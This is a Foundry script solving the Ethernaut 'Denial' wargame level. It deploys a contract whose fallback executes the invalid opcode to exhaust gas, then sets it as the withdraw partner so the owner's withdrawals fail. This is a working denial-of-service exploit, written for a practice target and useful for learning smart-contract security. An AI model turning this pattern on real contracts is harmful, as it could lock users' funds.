// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Denial} from "../src/Denial.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/Denial.s.sol --tc DenialSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

contract DenialSolution is Script {
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address payable public instance = payable(vm.envAddress("DENIAL_INSTANCE"));

    function run() external {
        vm.startBroadcast(deployerPrivateKey);
        Denial denial = Denial(instance);
        // create a denial attack contract
        DenialAttack attackContract = new DenialAttack();
        // set the attack contract as the partner
        denial.setWithdrawPartner(address(attackContract));

        vm.stopBroadcast();
    }

}

contract DenialAttack {

    fallback() external payable {
        // we will consume all the gas here using invalid opcode - https://www.evm.codes/#fe
        assembly {
            invalid()
        }
    }
    

}